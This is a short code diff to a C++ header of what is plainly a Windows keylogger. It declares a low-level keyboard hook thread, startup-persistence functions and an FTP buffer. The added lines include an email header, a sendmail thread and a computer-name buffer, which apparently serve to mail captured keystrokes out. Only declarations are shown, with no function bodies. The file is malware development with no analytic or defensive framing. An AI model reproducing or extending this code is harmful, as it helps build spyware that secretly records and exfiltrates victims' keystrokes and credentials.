@@ -11,6 +11,7 @@
 #include <ctime>
 #include <windows.h>
 #include <Shlwapi.h>
+#include "email.h"
 
 using std::string;
 using std::cout;
@@ -20,7 +21,9 @@ using std::map;
 
 
 unsigned int __stdcall keylogthreadhook(void *);
+unsigned int __stdcall sendmail(void *);
 LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);
+
 string gettime();
 void AddtoStartup();
 void RemoveFromStartup();
@@ -38,6 +41,7 @@ extern const string RegistryKeyName;
 
 extern char pathtofile[MAX_PATH];
 extern char ftpreadbuffer[1024];
+extern char computername[4096];
 
 enum COMMAND{CONTINUE, PAUSE, KILL};
 
